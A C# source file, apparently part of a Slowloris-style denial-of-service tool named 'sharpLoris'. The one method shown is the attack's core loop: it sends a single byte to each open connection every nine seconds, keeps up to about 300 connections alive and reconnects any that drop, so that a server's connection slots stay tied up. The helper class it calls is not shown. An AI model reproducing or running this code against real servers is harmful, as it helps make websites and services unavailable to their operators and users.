using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace sharpLoris
{
	internal static class LorisLIB
	{
		public static void BeginWriteCallBack(IAsyncResult ar)
		{
			Interlocked.Increment(ref TCPHcoll.wroteTotal);

			Task.Delay(TimeSpan.FromSeconds(9)).ContinueWith((x, m) =>
			{
				var co = m as TCPHcoll;
				if (co == null)
				{
					return;
				}
				if (TCPHcoll.bgWrite < 300)
				{
					co.ReCreate();
				}
				if (!co.Bqueue.Any())
				{
					co.Refill();
					Console.WriteLine("GluckGluckGluck, refilled!");
				}

				try
				{
					co.Ns.BeginWrite(new byte[] { co.Bqueue.Dequeue() }, 0, 1, LorisLIB.BeginWriteCallBack, co);
				}
				catch
				{
					Debug.WriteLine("Reconnecting aborted Stream");
					Interlocked.Decrement(ref TCPHcoll.bgWrite);
					co.ReCon();
				}
			}, ar.AsyncState, new System.Threading.CancellationToken());
		}
	}
}